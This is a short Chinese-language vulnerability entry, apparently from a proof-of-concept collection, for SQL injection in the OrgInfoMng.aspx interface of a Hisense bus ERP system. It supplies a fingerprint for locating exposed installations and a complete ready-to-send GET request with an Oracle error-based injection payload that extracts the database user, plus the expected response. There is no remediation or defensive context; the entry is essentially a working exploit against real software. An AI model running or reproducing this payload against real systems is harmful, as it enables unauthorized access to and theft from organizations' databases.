# 海信公交OrgInfoMng接口存在SQL注入漏洞

海信公交OrgInfoMng接口 ｜ SQL注入 ｜ —
- **指纹**：`"HisModules/ErpAdmin/RoleMng/Js/selectDefaultRole.js"`
- **请求**：`GET /Erp/ErpAdmin/Form/OrgInfoMng.aspx?RSID=-1%27%20and%20(select%20dbms_xdb_version.checkin((select%20user%20from%20dual))%20from%20dual)is%20not%20null-- HTTP/1.1`
- **响应特征**：200